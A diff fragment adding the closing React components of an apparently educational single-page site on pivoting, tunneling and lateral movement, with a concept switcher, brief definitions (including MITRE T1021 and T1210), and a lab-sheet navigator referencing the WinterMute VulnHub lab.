+    showReplay && h("button", { className: "concept-replay-btn", onClick: restart }, "\u21BB Replay"),
+    h(ConceptLegend, null)
+  );
+}
+
+
+function LateralNote() {
+  return h("div", { className: "lateral-note" },
+    h("p", null, h("strong", null, "T1021 \u2014 credential-based:"), " valid stolen credentials over a legitimate protocol (RDP, SSH, SMB)."),
+    h("p", null, h("strong", null, "T1210 \u2014 exploitation-based:"), " a vulnerable service on the second host, no credentials needed \u2014 this is the branch the lab walks through.")
+  );
+}
+
+function ConceptsView({ onGoLab }) {
+  const [modeId, setModeId] = useState("forward");
+  const mode = modes.find(m => m.id === modeId);
+  return h("div", { className: "concepts-view" },
+    h("div", { className: "concepts-inner" },
+      h("p", { className: "concepts-eyebrow" }, "FOUR TERMS, ONE RELAY"),
+      h("h1", { className: "concepts-title" }, "Pivoting, tunneling & lateral movement"),
+      h("p", { className: "concepts-sub" }, "Toggle between the four modes below and watch what actually changes."),
+      h("div", { className: "mode-switch" }, modes.map(m => h("button", {
+        key: m.id,
+        className: "mode-btn" + (m.id === modeId ? " active" : ""),
+        onClick: () => setModeId(m.id)
+      }, m.label))),
+      h(ConceptDiagram, { modeId }),
+      h("p", { className: "concepts-blurb" }, mode.blurb),
+      modeId === "lateral" && h(LateralNote, null),
+      h("div", { className: "concepts-keypoints" },
+        h("ul", { className: "key-points" },
+          h("li", null, "Port forwarding: a single relay hop moving raw traffic across a boundary it couldn't otherwise cross."),
+          h("li", null, "Tunneling: that same hop, encrypted \u2014 but only as far as your pivot, not automatically beyond it."),
+          h("li", null, "Forwarding + tunneling are usually layered, not swapped: SSH in, then plain relays deeper from there."),
+          h("li", null, "Pivoting: chaining through hosts until an entire otherwise-unreachable segment opens up."),
+          h("li", null, "Lateral movement: a shell that actually relocates onto one of those newly-reachable machines.")
+        )
+      ),
+      h("button", { className: "cta-btn", onClick: onGoLab }, "Start the lab \u2192")
+    )
+  );
+}
+
+/* ============================================================
+   LAB VIEW
+   ============================================================ */
+
+function SheetIndex({ modules, activeIndex, onSelect, doneMap }) {
+  const doneCount = Object.values(doneMap).filter(Boolean).length;
+  const trackable = modules.filter(m => !m.isReference);
+  const pct = trackable.length ? Math.round((doneCount / trackable.length) * 100) : 0;
+  return h("nav", { className: "sheet-index" },
+    h("div", { className: "sheet-index-label" }, "SHEET INDEX"),
+    modules.map((m, i) => h("button", {
+      key: m.id,
+      className: "sheet-item" + (i === activeIndex ? " active" : ""),
+      style: i === activeIndex ? { "--module-accent": m.accent } : {},
+      onClick: () => onSelect(i)
+    },
+      h("div", { className: "sheet-item-num" }, "SHEET " + String(i + 1).padStart(2, "0")),
+      h("div", { className: "sheet-item-title" }, doneMap[m.id] && h("span", { className: "sheet-item-check" }, "\u2713"), m.title.split(" \u2014 ")[0])
+    )),
+    h("div", { className: "sheet-index-footer" },
+      h("div", { className: "sheet-index-progress-label" }, doneCount + " / " + trackable.length + " COMPLETE"),
+      h("div", { className: "sheet-index-progress-track" }, h("div", { className: "sheet-index-progress-fill", style: { width: pct + "%" } }))
+    )
+  );
+}
+
+function modTitleAt(i) { const m = modules[i]; return m ? m.title.split(" \u2014 ")[0] : ""; }
+
+function SheetContent({ module, index, total, done, onToggleDone, onPrev, onNext, showBanner, onBackToConcepts, contentRef }) {
+  return h("div", { className: "sheet-content", ref: contentRef },
+    h("div", { className: "sheet-content-inner" },
+      index === 0 && h("button", { className: "back-link", onClick: onBackToConcepts }, "\u2190 Back to concepts"),
+      h("div", { style: { "--module-accent": module.accent } },
+        h("p", { className: "sheet-meta" }, "SHEET " + String(index + 1).padStart(2, "0") + " / " + String(total).padStart(2, "0") + " \u2014 " + module.day.toUpperCase()),
+        h("h2", { className: "sheet-title" }, module.title),
+        h("p", { className: "sheet-blurb" }, module.blurb),
+        module.isReference
+          ? [...module.sections.map((s, i) => h(ContentSection, { section: s, key: i })), h(ReferenceList, { key: "reflist" })]
+          : module.sections.map((s, i) => h(ContentSection, { section: s, key: i })),
+        !module.isReference && h(ProgressToggle, { moduleId: module.id, done, onToggle: onToggleDone }),
+        showBanner && h(BrandBanner, null),
+        module.isReference && h("p", { className: "sheet-footnote" }, "WinterMute is a free lab by creosote, hosted on VulnHub. Replace IP placeholders with the real addresses in your own environment.")
+      ),
+      h("div", { className: "sheet-nav" },
+        h("button", { className: "sheet-nav-btn prev", disabled: index === 0, onClick: onPrev },
+          h("span", { className: "sheet-nav-btn-dir" }, "\u2190 PREV SHEET"), index > 0 && h("span", { className: "sheet-nav-btn-label" }, modTitleAt(index - 1))),
+        h("button", { className: "sheet-nav-btn next", disabled: index === total - 1, onClick: onNext },
+          h("span", { className: "sheet-nav-btn-dir" }, "NEXT SHEET \u2192"), index < total - 1 && h("span", { className: "sheet-nav-btn-label" }, modTitleAt(index + 1)))
+      )
+    )
+  );
+}
+
+function LabView({ onBackToConcepts, onEnsureVisible }) {
+  const [activeIndex, setActiveIndex] = useState(0);
+  const [doneMap, setDoneMap] = useState(loadProgress);
+  const contentRef = useRef(null);
+
+  const toggleDone = id => { setDoneMap(prev => { const next = { ...prev, [id]: !prev[id] }; saveProgress(next); return next; }); };
+  const goTo = i => { if (i < 0 || i >= modules.length) return; setActiveIndex(i); if (contentRef.current) contentRef.current.scrollTop = 0; };
+
+  useEffect(() => {
+    window.__gotoReference = () => {
+      onEnsureVisible();
+      const refIndex = modules.findIndex(m => m.isReference);
+      if (refIndex >= 0) goTo(refIndex);
+    };
+    return () => { delete window.__gotoReference; };
+  }, []);
+
+  const activeModule = modules[activeIndex];
+  return h("div", { className: "shell-body" },
+    h(SheetIndex, { modules, activeIndex, onSelect: goTo, doneMap }),
+    h(SheetContent, {
+      module: activeModule, index: activeIndex, total: modules.length,
+      done: !!doneMap[activeModule.id], onToggleDone: toggleDone,
+      onPrev: () => goTo(activeIndex - 1), onNext: () => goTo(activeIndex + 1),
+      showBanner: activeIndex === 0, onBackToConcepts, contentRef
+    })
+  );
+}
+
+/* ============================================================
+   APP
+   ============================================================ */
+
+function App() {
+  const [view, setView] = useState("concepts");
+
+  return h(GlossaryProvider, null,
+    h("div", { className: "app-shell" },
+      h("header", { className: "header-strip" },
+        h("a", { className: "brand-block", href: "https://sarathg.me", target: "_blank", rel: "noopener noreferrer" },
+          h("span", { className: "brand-mark" }, "\u2733"), h("span", { className: "brand-name" }, "PIVOTING & TUNNELING")
+        ),
+        h("div", { className: "view-switch" },
+          h("button", { className: "view-btn" + (view === "concepts" ? " active" : ""), onClick: () => setView("concepts") }, "Concepts"),
+          h("button", { className: "view-btn" + (view === "lab" ? " active" : ""), onClick: () => setView("lab") }, "Lab guide")
+        ),
+        h("div", { className: "header-right" },
+          h("a", { className: "header-link", href: "https://sarathg.me", target: "_blank", rel: "noopener noreferrer" }, "sarathg.me \u2192")
+        )
+      ),
+      h("div", { style: { display: view === "concepts" ? "flex" : "none", flex: 1, minHeight: 0, flexDirection: "column" } },
+        h(ConceptsView, { onGoLab: () => setView("lab") })
+      ),
+      h("div", { style: { display: view === "lab" ? "flex" : "none", flex: 1, minHeight: 0 } },
+        h(LabView, { onBackToConcepts: () => setView("concepts"), onEnsureVisible: () => setView("lab") })
+      )
+    )
+  );
+}
+
+ReactDOM.createRoot(document.getElementById("root")).render(h(App));
+    </script>
+  </body>
+</html>
